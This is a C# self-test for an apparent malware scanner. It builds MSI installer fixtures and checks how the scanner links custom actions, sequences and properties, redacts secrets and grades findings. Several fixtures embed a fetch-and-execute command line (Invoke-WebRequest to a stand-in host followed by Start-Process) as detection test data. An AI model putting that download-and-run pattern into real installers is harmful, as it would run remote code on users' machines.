using System.IO;
using System.Runtime.InteropServices;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Rules;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Utilities;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    private const string MsiFixturePayload = "Invoke-WebRequest https://example.invalid/file; Start-Process steamprocess";

    private static async Task TestPhase2MsiAsync(string root, RuleSet rules)
    {
        MsiInspection split = MsiModel();
        split.Actions.AddRange([new("download", 51, "A", "Invoke-WebRequest https://example.invalid/file"), new("execute", 51, "B", "Start-Process steamprocess")]);
        split.Sequences.AddRange([new("InstallExecuteSequence", "download", "", 10), new("InstallExecuteSequence", "execute", "", 20)]);
        Check("MSI 无关动作不通过字符串拼接构成家族执行链", MsiActionAnalyzer.Analyze(split) is { ContentSignals.Count: 0, LinkedSignals.Count: 0 });

        MsiInspection literal = MsiModel();
        literal.Actions.Add(new("propertyOnly", 51, "PAYLOAD", MsiFixturePayload));
        MsiActionAnalysis literalAnalysis = MsiActionAnalyzer.Analyze(literal);
        Check("MSI Type51 单一恶意文本保留既有内容信号", literalAnalysis.ContentSignals.Count > 0);
        Check("MSI 未排入序列的 Type51 文本不冒充执行关联", literalAnalysis.LinkedSignals.Count == 0 && literalAnalysis.ContentSignals.All(s => s.Contains("未证明执行")));

        MsiInspection linked = MsiLinkedModel();
        MsiActionAnalysis linkedAnalysis = MsiActionAnalyzer.Analyze(linked);
        Check("MSI 同序列前置属性赋值关联到脚本动作", linkedAnalysis.ContentSignals.Count == 0 && linkedAnalysis.LinkedSignals.Count > 0);
        Check("MSI 同序列解析保留动作与顺序", linkedAnalysis.Evidence.Any(s => s.Contains("run @ InstallExecuteSequence/30") && s.Contains("完整=True")));

        foreach ((string name, int? sequence) in new (string, int?)[] { ("NULL", null), ("零", 0), ("结束处理", -1), ("无效负数", -5) })
        {
            MsiInspection inactive = MsiLinkedModel();
            inactive.Sequences.RemoveAll(s => s.Action == "run");
            inactive.Sequences.Add(new("InstallExecuteSequence", "run", "", sequence));
            Check("MSI " + name + "序列不构造常规动作链", MsiActionAnalyzer.Analyze(inactive).LinkedSignals.Count == 0);
        }
        MsiInspection unscheduled = MsiLinkedModel(); unscheduled.Sequences.RemoveAll(s => s.Action == "run");
        Check("MSI 未排入序列的属性脚本不构造执行链", MsiActionAnalyzer.Analyze(unscheduled).LinkedSignals.Count == 0);
        MsiInspection cross = MsiLinkedModel(); cross.Sequences[0] = cross.Sequences[0] with { Table = "InstallUISequence" };
        Check("MSI UI 属性不未经证明传入 Execute 序列", MsiActionAnalyzer.Analyze(cross).LinkedSignals.Count == 0);
        MsiInspection late = MsiLinkedModel(); late.Sequences[0] = late.Sequences[0] with { Sequence = 40 };
        Check("MSI 后置属性赋值不反向关联前置动作", MsiActionAnalyzer.Analyze(late).LinkedSignals.Count == 0);
        MsiInspection tied = MsiLinkedModel(); tied.Sequences[0] = tied.Sequences[0] with { Sequence = 30 };
        Check("MSI 相同序号赋值不猜测先后关系", MsiActionAnalyzer.Analyze(tied).LinkedSignals.Count == 0);
        MsiInspection conditional = MsiLinkedModel(); conditional.Sequences[0] = conditional.Sequences[0] with { Condition = "VersionNT" };
        Check("MSI 未求值条件的属性赋值保持未解析", MsiActionAnalyzer.Analyze(conditional).LinkedSignals.Count == 0);
        MsiInspection falseAction = MsiLinkedModel(); falseAction.Sequences[1] = falseAction.Sequences[1] with { Condition = "0" };
        Check("MSI 恒假条件不构造执行关联", MsiActionAnalyzer.Analyze(falseAction).LinkedSignals.Count == 0);
        MsiInspection deferred = MsiLinkedModel(); deferred.Actions[1] = deferred.Actions[1] with { Type = 54 | 0x400 };
        Check("MSI 延迟动作不猜测运行时属性上下文", MsiActionAnalyzer.Analyze(deferred) is { LinkedSignals.Count: 0, CoverageGaps.Count: > 0 });
        foreach ((string name, int flag) in new[] { ("首序列", 0x100), ("每进程一次", 0x200), ("客户端重复", 0x300), ("延迟赋值", 0x400) })
        {
            MsiInspection scheduling = MsiLinkedModel(); scheduling.Actions[0] = scheduling.Actions[0] with { Type = 51 | flag };
            MsiActionAnalysis analysis = MsiActionAnalyzer.Analyze(scheduling);
            Check("MSI " + name + "属性赋值保持上下文未解析", analysis.LinkedSignals.Count == 0 && analysis.CoverageGaps.Any(g => g.Contains("调度或脚本上下文")));
        }

        MsiInspection repeated = MsiLinkedModel();
        repeated.Properties.Clear(); repeated.Properties.Add(new("CODE", "Invoke-WebRequest https://example.invalid/file"));
        repeated.Actions[0] = new("set", 51, "CODE", "[CODE]; Start-Process steamprocess");
        Check("MSI Type51 在自身位置引用前一属性值", MsiActionAnalyzer.Analyze(repeated).LinkedSignals.Count > 0);

        MsiInspection missing = MsiLinkedModel(); missing.Properties.Clear();
        Check("MSI 缺失属性引用不作为完整行为链", MsiActionAnalyzer.Analyze(missing) is { LinkedSignals.Count: 0, CoverageGaps.Count: > 0 });
        MsiInspection failed = MsiLinkedModel(); failed.Tables.RemoveAll(t => t.Table == "CustomAction"); failed.Tables.Add(new("CustomAction", MsiReadState.Failed, 1, "fixture"));
        Check("MSI 动作表失败不推断完整顺序", MsiActionAnalyzer.Analyze(failed) is { LinkedSignals.Count: 0, CoverageGaps.Count: > 0 });
        MsiInspection environment = MsiLinkedModel(); environment.Actions[0] = environment.Actions[0] with { Target = "[%UNRESOLVED]; " + MsiFixturePayload };
        Check("MSI 未解析环境引用不能变为完整关联", MsiActionAnalyzer.Analyze(environment).LinkedSignals.Count == 0);

        MsiInspection paths = MsiModel();
        paths.Directories.AddRange([new("TARGETDIR", "", "SourceDir"), new("LocalAppDataFolder", "TARGETDIR", "."), new("INSTALLFOLDER", "LocalAppDataFolder", "SHORT|Haresfoot")]);
        paths.Components.Add(new("component", "INSTALLFOLDER", "", "file"));
        paths.Files.Add(new("file", "component", "SHORT.EXE|EnteSys.exe", 123, 2));
        paths.Media.Add(new(1, 13, "#fixture.cab"));
        paths.Actions.Add(new("LaunchFile", 210, "file", ""));
        paths.Sequences.AddRange([new("InstallExecuteSequence", "InstallFinalize", "", 6600), new("InstallExecuteSequence", "LaunchFile", "", 6601)]);
        MsiActionAnalysis pathAnalysis = MsiActionAnalyzer.Analyze(paths);
        Check("MSI File Component Directory 重建符号安装路径", pathAnalysis.Evidence.Any(s => s.Contains(@"[LocalAppDataFolder]\Haresfoot\EnteSys.exe")));
        Check("MSI File.Sequence 关联 Media 声明而非猜测 CAB 身份", pathAnalysis.Evidence.Any(s => s.Contains("File.Sequence=2") && s.Contains("Media=1 #fixture.cab") && s.Contains("不证明 CAB 成员身份")));
        Check("MSI 210 解码 File EXE 异步并忽略返回码", pathAnalysis.Evidence.Any(s => s.Contains("基本类型=18 File EXE") && s.Contains("异步") && s.Contains("忽略返回码")));
        Check("MSI 正向记录 InstallFinalize 后的声明", pathAnalysis.Evidence.Any(s => s.Contains("位于 InstallFinalize 之后")));
        Check("MSI 文件名和正常安装声明不能单独判恶", pathAnalysis.ContentSignals.Count == 0 && pathAnalysis.LinkedSignals.Count == 0);
        MsiInspection workingDirectory = MsiModel();
        workingDirectory.Directories.AddRange([new("TARGETDIR", "", "SourceDir"), new("WORK", "TARGETDIR", "steamprocess")]);
        workingDirectory.Actions.Add(new("working", 34, "WORK", "Invoke-WebRequest https://example.invalid/file; Start-Process normal"));
        workingDirectory.Sequences.Add(new("InstallExecuteSequence", "working", "", 10));
        Check("MSI Type34 工作目录文本不冒充可执行命令", MsiActionAnalyzer.Analyze(workingDirectory) is { ContentSignals.Count: 0, LinkedSignals.Count: 0 });
        paths.Directories[2] = paths.Directories[2] with { Parent = "INSTALLFOLDER" };
        Check("MSI 目录循环留下可见缺口", MsiActionAnalyzer.Analyze(paths).CoverageGaps.Any(s => s.Contains("循环")));

        MsiInspection binary = MsiModel(); binary.Actions.Add(new("binary", 2, "resource", "normal"));
        Check("MSI 缺失 Binary 引用保留缺口", MsiActionAnalyzer.Analyze(binary).CoverageGaps.Any(s => s.Contains("缺失 Binary")));
        binary.BinaryNames.Add("resource");
        Check("MSI 已存在 Binary 名称建立声明关联", MsiActionAnalyzer.Analyze(binary).Evidence.Any(s => s.Contains("Binary:resource") && s.Contains("成员扫描独立检查")));
        Check("MSI 回滚和提交标志按 InScript 上下文解码", MsiActionAnalyzer.DescribeType(18 | 0x400 | 0x100 | 0x800).Contains("回滚脚本") && MsiActionAnalyzer.DescribeType(18 | 0x400 | 0x200).Contains("提交脚本"));

        MsiInspection bounded = MsiModel();
        bounded.Actions.AddRange(Enumerable.Range(0, 700).Select(i => new MsiCustomAction("action" + i, 51, "P" + i, new string('x', 1000))));
        MsiActionAnalysis boundedAnalysis = MsiActionAnalyzer.Analyze(bounded);
        Check("MSI 语义证据行数与字符均有界", boundedAnalysis.Evidence.Count <= MsiActionAnalyzer.MaximumEvidenceLines && boundedAnalysis.Evidence.Sum(s => s.Length) <= MsiActionAnalyzer.MaximumEvidenceCharacters);
        Check("MSI 动作分析和显示截断保留缺口", boundedAnalysis.CoverageGaps.Any(s => s.Contains("512")) && boundedAnalysis.CoverageGaps.Any(s => s.Contains("摘要达到")));
        MsiInspection secret = MsiModel(); secret.Actions.Add(new("secret", 51, "PASSWORD", "fixture-private-value"));
        Check("MSI 敏感属性 Target 不进入报告证据", !string.Join(" ", MsiActionAnalyzer.Analyze(secret).Evidence).Contains("fixture-private-value"));
        foreach (MsiReadState state in new[] { MsiReadState.Failed, MsiReadState.LimitReached })
        {
            MsiInspection undiscovered = new(); undiscovered.Tables.Add(new("_Tables", state, 0, "fixture-table-directory-failure"));
            StructuredInspection retained = new(); StructuredContainerInspector.ApplyMsiMetadata(retained, undiscovered);
            Check("MSI 未识别时保留表目录 " + state + " 具体缺口", !retained.Recognized && retained.Notes.Any(n => n.Contains("_Tables") && n.Contains(state.ToString()) && n.Contains("fixture-table-directory-failure")));
        }

        string folder = Path.Combine(root, "phase2-msi"); Directory.CreateDirectory(folder);
        string native = Path.Combine(folder, "typed.msi");
        CreatePhase2MsiFixture(native, [
            "CREATE TABLE `Property` (`Property` CHAR(72) NOT NULL, `Value` CHAR(0) LOCALIZABLE PRIMARY KEY `Property`)",
            "INSERT INTO `Property` (`Property`,`Value`) VALUES ('DOWNLOAD','Invoke-WebRequest https://example.invalid/file')",
            "INSERT INTO `Property` (`Property`,`Value`) VALUES ('PASSWORD','fixture-secret-property')",
            "CREATE TABLE `Directory` (`Directory` CHAR(72) NOT NULL, `Directory_Parent` CHAR(72), `DefaultDir` CHAR(255) NOT NULL LOCALIZABLE PRIMARY KEY `Directory`)",
            "INSERT INTO `Directory` (`Directory`,`Directory_Parent`,`DefaultDir`) VALUES ('TARGETDIR','','SourceDir')",
            "INSERT INTO `Directory` (`Directory`,`Directory_Parent`,`DefaultDir`) VALUES ('LocalAppDataFolder','TARGETDIR','.')",
            "INSERT INTO `Directory` (`Directory`,`Directory_Parent`,`DefaultDir`) VALUES ('INSTALLFOLDER','LocalAppDataFolder','SHORT|Fixture')",
            "CREATE TABLE `Component` (`Component` CHAR(72) NOT NULL, `Directory_` CHAR(72) NOT NULL, `Condition` CHAR(255), `KeyPath` CHAR(72) PRIMARY KEY `Component`)",
            "INSERT INTO `Component` (`Component`,`Directory_`,`Condition`,`KeyPath`) VALUES ('component','INSTALLFOLDER','','file')",
            "CREATE TABLE `File` (`File` CHAR(72) NOT NULL, `Component_` CHAR(72) NOT NULL, `FileName` CHAR(255) NOT NULL LOCALIZABLE, `FileSize` LONG NOT NULL, `Sequence` SHORT NOT NULL PRIMARY KEY `File`)",
            "INSERT INTO `File` (`File`,`Component_`,`FileName`,`FileSize`,`Sequence`) VALUES ('file','component','fixture.exe',123,2)",
            "CREATE TABLE `Media` (`DiskId` SHORT NOT NULL, `LastSequence` SHORT NOT NULL, `Cabinet` CHAR(255) PRIMARY KEY `DiskId`)",
            "INSERT INTO `Media` (`DiskId`,`LastSequence`,`Cabinet`) VALUES (1,2,'external-fixture.cab')",
            Phase2ActionSchema,
            "INSERT INTO `CustomAction` (`Action`,`Type`,`Source`,`Target`) VALUES ('set',51,'CODE','[DOWNLOAD]; Start-Process steamprocess')",
            "INSERT INTO `CustomAction` (`Action`,`Type`,`Source`,`Target`) VALUES ('run',54,'CODE','')",
            "INSERT INTO `CustomAction` (`Action`,`Type`,`Source`,`Target`) VALUES ('secret',51,'PASSWORD','fixture-private-value')",
            Phase2ExecuteSchema,
            "INSERT INTO `InstallExecuteSequence` (`Action`,`Condition`,`Sequence`) VALUES ('set','',10)",
            "INSERT INTO `InstallExecuteSequence` (`Action`,`Condition`,`Sequence`) VALUES ('run','',30)",
            "CREATE TABLE `Registry` (`Registry` CHAR(72) NOT NULL, `Root` SHORT NOT NULL, `Key` CHAR(255) NOT NULL LOCALIZABLE, `Name` CHAR(255) LOCALIZABLE, `Value` CHAR(0) LOCALIZABLE, `Component_` CHAR(72) NOT NULL PRIMARY KEY `Registry`)",
            "INSERT INTO `Registry` (`Registry`,`Root`,`Key`,`Name`,`Value`,`Component_`) VALUES ('reg',1,'Software\\Fixture','Value','normal','component')",
            "CREATE TABLE `Shortcut` (`Shortcut` CHAR(72) NOT NULL, `Directory_` CHAR(72) NOT NULL, `Name` CHAR(128) NOT NULL LOCALIZABLE, `Component_` CHAR(72) NOT NULL, `Target` CHAR(255), `Arguments` CHAR(255), `WkDir` CHAR(72) PRIMARY KEY `Shortcut`)",
            "INSERT INTO `Shortcut` (`Shortcut`,`Directory_`,`Name`,`Component_`,`Target`,`Arguments`,`WkDir`) VALUES ('shortcut','INSTALLFOLDER','Fixture','component','[#file]','--normal','INSTALLFOLDER')",
            "CREATE TABLE `ServiceInstall` (`ServiceInstall` CHAR(72) NOT NULL, `Name` CHAR(255) NOT NULL, `ServiceType` LONG NOT NULL, `StartType` LONG NOT NULL, `Arguments` CHAR(255), `Component_` CHAR(72) NOT NULL, `Password` CHAR(255) PRIMARY KEY `ServiceInstall`)",
            "INSERT INTO `ServiceInstall` (`ServiceInstall`,`Name`,`ServiceType`,`StartType`,`Arguments`,`Component_`,`Password`) VALUES ('service','FixtureService',16,3,'--normal','component','fixture-secret-service')",
            "CREATE TABLE `ServiceControl` (`ServiceControl` CHAR(72) NOT NULL, `Name` CHAR(255) NOT NULL, `Event` SHORT NOT NULL, `Arguments` CHAR(255), `Component_` CHAR(72) NOT NULL PRIMARY KEY `ServiceControl`)",
            "INSERT INTO `ServiceControl` (`ServiceControl`,`Name`,`Event`,`Arguments`,`Component_`) VALUES ('control','FixtureService',1,'','component')"
        ]);
        string before = await Hashing.Sha256FileAsync(native);
        using (TemporaryDirectory temporary = new())
        {
            StructuredInspection read = StructuredContainerInspector.ReadMsi(native, temporary, 4096, 4096, 8, default);
            Check("MSI 原生只读读取全部新增表的类型记录", read.Msi is { Properties.Count: 2, Directories.Count: 3, Components.Count: 1, Files.Count: 1, Registry.Count: 1, Shortcuts.Count: 1, Services.Count: 1, ServiceControls.Count: 1 });
            Check("MSI 缺失表与完整表分别标记", read.Msi!.Tables.Any(t => t.Table == "InstallUISequence" && t.State == MsiReadState.Absent) && read.Msi.Tables.Any(t => t.Table == "CustomAction" && t.State == MsiReadState.Complete));
            Check("MSI 原生读取后产生同动作属性关联", read.MsiAnalysis!.LinkedSignals.Count > 0 && read.MsiAnalysis.ContentSignals.Count == 0);
            Check("MSI 外部分卷不访问并记录缺口", read.Notes.Any(s => s.Contains("外部 CAB")) && read.Members.Count == 0);
            string exported = string.Join(" ", read.Metadata.Concat(read.MsiAnalysis.Evidence));
            Check("MSI 服务密码和敏感属性不会泄露到摘要", !exported.Contains("fixture-secret") && !exported.Contains("fixture-private-value"));
        }
        Check("MSI 只读检查不修改源数据库", before == await Hashing.Sha256FileAsync(native));
        ScanReport linkedReport = new();
        using (ContentScanner scanner = new(rules)) await scanner.ScanRootAsync(native, linkedReport, ContentOptions(), new NullPasswordProvider());
        Finding linkedFinding = linkedReport.Findings.Single(f => f.RuleId == "INSTALLER-STRUCTURE");
        Check("MSI 新的属性关联进入生产扫描且只供复核", linkedFinding.Score == 40 && linkedFinding.Severity == FindingSeverity.Medium && linkedFinding.ReasonCode == "ScriptTokenCooccurrenceOnly" && !linkedFinding.CanRemediate && linkedFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.ReviewOnly]) && !linkedFinding.IsKnownMalware);
        Check("MSI 静态属性关联标注关联风险层级但不升级处置资格", linkedFinding.AssociationEvidenceTier == RelatedEvidenceTier.RelatedRisk && !linkedFinding.CanRemediate);

        string direct = Path.Combine(folder, "direct.msi");
        CreatePhase2MsiFixture(direct, [Phase2ActionSchema, "INSERT INTO `CustomAction` (`Action`,`Type`,`Source`,`Target`) VALUES ('literal',51,'PAYLOAD','" + MsiFixturePayload + "')"]);
        ScanReport directReport = new();
        using (ContentScanner scanner = new(rules)) await scanner.ScanRootAsync(direct, directReport, ContentOptions(), new NullPasswordProvider());
        Check("MSI 单一 Type51 静态词语不能取得隔离权限", directReport.Findings.Any(f => f.RuleId == "INSTALLER-STRUCTURE" && !f.CanRemediate && f.Score == 40 && f.Severity == FindingSeverity.Medium && f.ReasonCode == "ScriptTokenCooccurrenceOnly" && !f.IsKnownMalware));

        string incomplete = Path.Combine(folder, "incomplete.msi");
        CreatePhase2MsiFixture(incomplete, [Phase2ActionSchema,
            "CREATE TABLE `File` (`File` CHAR(72) NOT NULL, `Component_` CHAR(72), `FileName` CHAR(255), `FileSize` LONG PRIMARY KEY `File`)"]);
        using (TemporaryDirectory temporary = new())
        {
            StructuredInspection read = StructuredContainerInspector.ReadMsi(incomplete, temporary, 4096, 4096, 8, default);
            Check("MSI 列缺失导致 Failed 而非静默视为不存在", read.Msi!.Tables.Any(t => t.Table == "File" && t.State == MsiReadState.Failed) && read.Notes.Any(s => s.Contains("File: Failed")));
        }
        string fieldLimit = Path.Combine(folder, "field-limit.msi");
        CreatePhase2MsiFixture(fieldLimit, [Phase2ActionSchema, "INSERT INTO `CustomAction` (`Action`,`Type`,`Source`,`Target`) VALUES ('long',51,'P','" + new string('x', MsiDatabaseReader.MaximumFieldCharacters + 1) + "')"]);
        using (TemporaryDirectory temporary = new())
        {
            StructuredInspection read = StructuredContainerInspector.ReadMsi(fieldLimit, temporary, 4096, 4096, 8, default);
            Check("MSI 超长字段保留 LimitReached 而不使扫描失败", read.Msi!.Tables.Any(t => t.Table == "CustomAction" && t.State == MsiReadState.LimitReached) && read.Notes.Any(s => s.Contains("字段超过")));
        }
        const string propertySchema = "CREATE TABLE `Property` (`Property` CHAR(72) NOT NULL, `Value` CHAR(0) LOCALIZABLE PRIMARY KEY `Property`)";
        string rowLimit = Path.Combine(folder, "row-limit.msi");
        CreatePhase2MsiFixture(rowLimit, new[] { propertySchema }.Concat(Enumerable.Range(0, MsiDatabaseReader.MaximumTableRows + 1)
            .Select(i => "INSERT INTO `Property` (`Property`,`Value`) VALUES ('P" + i + "','normal')")));
        using (TemporaryDirectory temporary = new())
        {
            StructuredInspection read = StructuredContainerInspector.ReadMsi(rowLimit, temporary, 4096, 4096, 8, default);
            Check("MSI 原生每表行数预算保留读取条数与缺口", read.Msi!.Tables.Any(t => t.Table == "Property" && t.State == MsiReadState.LimitReached && t.Rows == MsiDatabaseReader.MaximumTableRows));
        }
        string textLimit = Path.Combine(folder, "text-limit.msi");
        string value = new('x', MsiDatabaseReader.MaximumFieldCharacters);
        CreatePhase2MsiFixture(textLimit, new[] { propertySchema, Phase2ActionSchema }.Concat(Enumerable.Range(0, 260)
            .Select(i => "INSERT INTO `Property` (`Property`,`Value`) VALUES ('P" + i + "','" + value + "')")));
        using (TemporaryDirectory temporary = new())
        {
            StructuredInspection read = StructuredContainerInspector.ReadMsi(textLimit, temporary, 4096, 4096, 8, default);
            Check("MSI 共享文本预算停止后续已存在表并标记未检查", read.Msi!.Tables.Any(t => t.Table == "Property" && t.State == MsiReadState.LimitReached) && read.Msi.Tables.Any(t => t.Table == "CustomAction" && t.State == MsiReadState.NotChecked));
            Check("MSI 正好8192字符字段成功读取后才累计到共享预算", read.Msi.Properties.Count > 0 && read.Msi.Properties.All(p => p.Value.Length == MsiDatabaseReader.MaximumFieldCharacters));
        }
        string memberFile = Path.Combine(folder, "harmless-member.bin"); await File.WriteAllBytesAsync(memberFile, new byte[1024]);
        string memberLimit = Path.Combine(folder, "member-limit.msi");
        CreatePhase2MsiFixture(memberLimit, [Phase2ActionSchema,
            "INSERT INTO `CustomAction` (`Action`,`Type`,`Source`,`Target`) VALUES ('property',51,'FIXTURE','fixture-member-limit-marker')",
            "CREATE TABLE `Binary` (`Name` CHAR(72) NOT NULL, `Data` OBJECT NOT NULL PRIMARY KEY `Name`)"], database =>
        {
            uint record = Phase2MsiNative.CreateRecord(2);
            if (record == 0) throw new IOException("Cannot create harmless MSI member record");
            uint view = 0;
            try
            {
                if (Phase2MsiNative.SetString(record, 1, "harmless") != 0 || Phase2MsiNative.SetStream(record, 2, memberFile) != 0 ||
                    MsiFixture.View(database, "SELECT `Name`,`Data` FROM `Binary`", out view) != 0 || MsiFixture.Execute(view, 0) != 0 ||
                    Phase2MsiNative.Modify(view, 1, record) != 0) throw new IOException("Cannot insert harmless MSI member fixture");
            }
            finally { if (view != 0) MsiFixture.Close(view); MsiFixture.Close(record); }
        });
        using (TemporaryDirectory temporary = new())
        {
            StructuredInspection read = StructuredContainerInspector.ReadMsi(memberLimit, temporary, 1, 4096, 8, default);
            Check("MSI 成员超限不丢弃此前已读出的结构证据", read.Recognized && read.MsiAnalysis is not null &&
                read.Metadata.Any(m => m.Contains("fixture-member-limit-marker")) && read.Members.Count == 0 && read.Notes.Any(n => n.Contains("安装包成员展开达到大小上限")));
        }
        ScanReport memberReport = new();
        using (ContentScanner scanner = new(rules)) await scanner.ScanRootAsync(memberLimit, memberReport,
            new ScanOptions { IncludeSystem = false, IncludeSteam = false, IncludeWorkshop = false, UseAmsi = false, MaximumEntryBytes = 1 }, new NullPasswordProvider());
        Check("MSI 成员预算失败仍输出结构发现和覆盖缺口", memberReport.Findings.Any(f => f.RuleId == "INSTALLER-STRUCTURE") && memberReport.Coverage == ScanCoverage.Partial);
        Check("MSI 普通结构声明保留观察层级", memberReport.Findings.Single(f => f.RuleId == "INSTALLER-STRUCTURE").AssociationEvidenceTier == RelatedEvidenceTier.Observation);
    }

    private static MsiInspection MsiModel()
    {
        MsiInspection model = new() { Recognized = true };
        foreach (string table in new[] { "Property", "Directory", "Component", "File", "Media", "CustomAction", "InstallExecuteSequence", "InstallUISequence", "Registry", "Shortcut", "ServiceInstall", "ServiceControl", "Binary" })
            model.Tables.Add(new(table, MsiReadState.Complete, 0));
        return model;
    }
    private static MsiInspection MsiLinkedModel()
    {
        MsiInspection model = MsiModel();
        model.Properties.Add(new("DOWNLOAD", "Invoke-WebRequest https://example.invalid/file"));
        model.Actions.AddRange([new("set", 51, "CODE", "[DOWNLOAD]; Start-Process steamprocess"), new("run", 54, "CODE", "")]);
        model.Sequences.AddRange([new("InstallExecuteSequence", "set", "", 10), new("InstallExecuteSequence", "run", "", 30)]);
        return model;
    }
    private const string Phase2ActionSchema = "CREATE TABLE `CustomAction` (`Action` CHAR(72) NOT NULL, `Type` SHORT NOT NULL, `Source` CHAR(72), `Target` CHAR(0) LOCALIZABLE PRIMARY KEY `Action`)";
    private const string Phase2ExecuteSchema = "CREATE TABLE `InstallExecuteSequence` (`Action` CHAR(72) NOT NULL, `Condition` CHAR(255), `Sequence` SHORT PRIMARY KEY `Action`)";
    private static void CreatePhase2MsiFixture(string path, IEnumerable<string> queries, Action<uint>? initialize = null)
    {
        if (MsiFixture.Open(path, new IntPtr(3), out uint database) != 0) throw new IOException("Cannot create harmless MSI test database");
        try
        {
            foreach (string sql in queries)
            {
                uint code = MsiFixture.View(database, sql, out uint view);
                if (code != 0) throw new IOException("MSI test view " + code);
                try { code = MsiFixture.Execute(view, 0); if (code != 0) throw new IOException("MSI test fixed query " + code); }
                finally { MsiFixture.Close(view); }
            }
            initialize?.Invoke(database);
            if (MsiFixture.Commit(database) != 0) throw new IOException("MSI test commit failed");
        }
        finally { MsiFixture.Close(database); }
    }
    private static class Phase2MsiNative
    {
        [DllImport("msi.dll", EntryPoint = "MsiCreateRecord")] internal static extern uint CreateRecord(uint fields);
        [DllImport("msi.dll", EntryPoint = "MsiRecordSetStringW", CharSet = CharSet.Unicode)] internal static extern uint SetString(uint record, uint field, string value);
        [DllImport("msi.dll", EntryPoint = "MsiRecordSetStreamW", CharSet = CharSet.Unicode)] internal static extern uint SetStream(uint record, uint field, string path);
        [DllImport("msi.dll", EntryPoint = "MsiViewModify")] internal static extern uint Modify(uint view, int mode, uint record);
    }
}
